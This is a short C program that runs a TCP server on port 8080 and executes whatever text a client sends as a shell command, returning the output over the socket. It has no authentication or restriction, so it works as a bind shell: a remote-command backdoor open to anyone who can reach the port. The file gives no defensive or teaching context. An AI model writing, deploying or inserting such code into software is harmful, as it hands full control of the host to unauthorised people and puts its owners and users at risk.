#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define MAX_BUFFER_SIZE 1024

void executeCommand(int socket) {
    char buffer[MAX_BUFFER_SIZE];
    int bytesRead;

    bytesRead = recv(socket, buffer, sizeof(buffer) - 1, 0);
    if (bytesRead < 0) {
        perror("Error receiving data");
        exit(EXIT_FAILURE);
    }

    buffer[bytesRead] = '\0';
    printf("Received command: %s\n", buffer);

    FILE* commandOutput = popen(buffer, "r");
    if (commandOutput == NULL) {
        perror("Error executing command");
        exit(EXIT_FAILURE);
    }

    while (fgets(buffer, sizeof(buffer), commandOutput) != NULL) {
        if (send(socket, buffer, strlen(buffer), 0) < 0) {
            perror("Error sending data");
            exit(EXIT_FAILURE);
        }
    }

    pclose(commandOutput);
}

int main() {
    int serverSocket, clientSocket;
    struct sockaddr_in serverAddress, clientAddress;
    socklen_t clientAddressLength;
    int opt = 1;

    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket < 0) {
        perror("Error creating socket");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        perror("Error setting socket options");
        exit(EXIT_FAILURE);
    }

    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8080); // Replace with the desired port number
    serverAddress.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
        perror("Error binding socket");
        exit(EXIT_FAILURE);
    }

    if (listen(serverSocket, 5) < 0) {
        perror("Error listening for connections");
        exit(EXIT_FAILURE);
    }

    printf("Server is listening on port 8080...\n");

    while (1) {
        clientAddressLength = sizeof(clientAddress);
        clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddress, &clientAddressLength);
        if (clientSocket < 0) {
            perror("Error accepting connection");
            exit(EXIT_FAILURE);
        }

        printf("Accepted a new connection\n");

        executeCommand(clientSocket);

        close(clientSocket);

        printf("Connection closed\n");
    }

    close(serverSocket);

    return 0;
}
